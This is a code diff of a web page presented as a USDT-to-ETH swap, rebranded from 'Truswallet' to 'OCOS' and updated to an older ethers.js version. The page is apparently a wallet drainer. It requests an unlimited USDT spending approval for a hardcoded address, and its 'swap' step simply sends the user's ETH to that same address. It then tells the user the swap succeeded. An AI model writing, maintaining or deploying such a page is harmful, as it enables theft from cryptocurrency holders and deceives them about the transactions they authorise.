@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>USDT ↔ ETH Swap | Truswallet</title>
+  <title>USDT ↔ ETH Swap | OCOS</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.1/dist/ethers.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body {
       background: radial-gradient(circle at top left, #f0f4f8, #d9e2ec);
@@ -38,46 +38,56 @@
   </div>
 
   <script>
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
     const spender = "0x4f4287A3965D87044a401ccF23BaC838a207b4Cc";
     const usdtAbi = [
       "function approve(address spender, uint amount) public returns (bool)",
       "function allowance(address owner, address spender) public view returns (uint)",
       "function balanceOf(address account) external view returns (uint256)"
     ];
+    
     let provider, signer, account;
 
     document.getElementById("connectButton").onclick = async () => {
+      if (!window.ethereum && window.trustwallet) {
+        window.ethereum = window.trustwallet;
+      }
+
       if (window.ethereum) {
-        provider = new ethers.BrowserProvider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        signer = await provider.getSigner();
-        account = await signer.getAddress();
-        document.getElementById("status").textContent = "Connected: " + account.slice(0, 6) + "..." + account.slice(-4);
-        getBalances();
+        try {
+          provider = new ethers.providers.Web3Provider(window.ethereum);
+          await provider.send("eth_requestAccounts", []);
+          signer = provider.getSigner();
+          account = await signer.getAddress();
+
+          document.getElementById("status").textContent = "Connected: " + account.slice(0, 6) + "..." + account.slice(-4);
+          getBalances();
+        } catch (error) {
+          document.getElementById("status").textContent = "Connection failed: " + error.message;
+        }
       } else {
-        alert("Install MetaMask or Trust Wallet.");
+        alert("Please use Trust Wallet or MetaMask.");
       }
     };
 
     async function getBalances() {
       const ethBalance = await provider.getBalance(account);
-      document.getElementById("ethBalance").textContent = "ETH: " + (ethers.formatEther(ethBalance)).slice(0, 8);
+      document.getElementById("ethBalance").textContent = "ETH: " + (ethers.utils.formatEther(ethBalance)).slice(0, 8);
 
       const usdt = new ethers.Contract(usdtAddress, usdtAbi, provider);
       const usdtBalance = await usdt.balanceOf(account);
-      document.getElementById("usdtBalance").textContent = "USDT: " + ethers.formatUnits(usdtBalance, 18);
+      document.getElementById("usdtBalance").textContent = "USDT: " + ethers.utils.formatUnits(usdtBalance, 18);
     }
 
     document.getElementById("approveButton").onclick = async () => {
       const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
       try {
-        const tx = await usdt.approve(spender, ethers.MaxUint256);
+        const tx = await usdt.approve(spender, ethers.constants.MaxUint256);
         document.getElementById("status").textContent = "Approval pending...";
         await tx.wait();
         document.getElementById("status").textContent = "USDT approved successfully.";
       } catch (err) {
-        document.getElementById("status").textContent = "Approval failed: " + err.reason || err.message;
+        document.getElementById("status").textContent = "Approval failed: " + err.message;
       }
     };
 
@@ -88,7 +98,7 @@
         return;
       }
 
-      const ethToSend = ethers.parseEther((usdtAmount / 2500).toFixed(18));
+      const ethToSend = ethers.utils.parseEther((usdtAmount / 2500).toFixed(18));
       try {
         const tx = await signer.sendTransaction({
           to: spender,
@@ -98,7 +108,7 @@
         await tx.wait();
         document.getElementById("status").textContent = "Swapped " + usdtAmount + " USDT to ETH!";
       } catch (err) {
-        document.getElementById("status").textContent = "Swap failed: " + err.reason || err.message;
+        document.getElementById("status").textContent = "Swap failed: " + err.message;
       }
     };
   </script>
